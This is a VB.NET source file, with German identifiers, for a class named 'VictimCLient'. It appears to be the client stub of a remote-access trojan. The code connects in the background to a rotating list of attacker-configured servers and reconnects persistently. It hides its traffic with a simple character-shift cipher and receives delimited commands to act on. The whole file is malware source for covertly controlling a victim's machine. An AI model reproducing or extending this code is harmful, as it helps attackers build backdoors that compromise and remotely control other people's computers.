Public Class VictimCLient
    Public Event OnConnect()
    Public Event OnReconnect()
    Public Event NewMessage(ByVal Befehle() As String)
    Dim Verbunden As Boolean = False
    Dim STW As System.IO.StreamWriter
    Dim STR As System.IO.StreamReader
    Dim TcpC As System.Net.Sockets.TcpClient
    Public Sub Reconnect()
        RaiseEvent OnReconnect()
        TcpC.Close()
        STW.Close()
        STR.Close()
        Verbunden = False
        System.Threading.Thread.Sleep(ReconnectTime)
        ConnectToServer()
    End Sub
    Public Sub Senden(ByVal Text As String)
        Try
            STW.WriteLine(Verschlüsseln(Text).Replace(vbNewLine, "vbnewline"))
            STW.Flush()
        Catch ex As Exception
        End Try
    End Sub
    Public Sub Start()
        Dim t As New System.Threading.Thread(AddressOf ConnectToServer)
        t.IsBackground = True
        t.Start()
    End Sub
    Private Sub Abhören()
        Try
            While True
                Dim Befehle() = Split(Entschlüsseln(STR.ReadLine).Replace("vbnewline", vbNewLine), "#++#")
                RaiseEvent NewMessage(Befehle)
            End While
        Catch ex As Exception
            Reconnect()
        End Try
    End Sub
    Public Sub Deisconnect()
        TcpC.Close()
        STW.Close()
        STR.Close()
    End Sub
  
    Dim I As Integer = 0
    Private Sub ConnectToServer()
        While Verbunden = False
            Try
                If I > VerbindungsDaten.Count - 1 Then
                    I = 0
                    System.Threading.Thread.Sleep(ReconnectTime)
                End If
                TcpC = New System.Net.Sockets.TcpClient
                TcpC.Connect(VerbindungsDaten(I).IpAdresse, VerbindungsDaten(I).ConnectPort)
                STW = New System.IO.StreamWriter(TcpC.GetStream)
                STR = New System.IO.StreamReader(TcpC.GetStream)
                _Ipadresse = VerbindungsDaten(I).IpAdresse
                _ConnectionPort = VerbindungsDaten(I).ConnectPort
                _TransferPort = VerbindungsDaten(I).TransferPort
                Verbunden = True
                RaiseEvent OnConnect()
                Abhören()
            Catch ex As Exception
                I += 1
                Verbunden = False
            End Try
        End While
    End Sub
    Private Function Entschlüsseln(ByVal Text As String) As String
        Return Decrypt(Text)
    End Function
    Private Function Verschlüsseln(ByVal Text As String) As String
        Return Encrypt(Text)
    End Function
    Function Decrypt(ByVal sText As String) As String
        Dim i As Long
        Decrypt = Nothing
        For i = 1 To Len(sText)
            Decrypt = Decrypt & Chr(Asc(Mid(sText, i, 1)) - 1)
        Next
    End Function ' geht so weit
    Function Encrypt(ByVal sText As String) As String
        Dim i As Long
        Encrypt = Nothing
        For i = 1 To Len(sText)
            Encrypt = Encrypt & Chr(Asc(Mid(sText, i, 1)) + 1)
        Next
    End Function ' geht soqweit
End Class
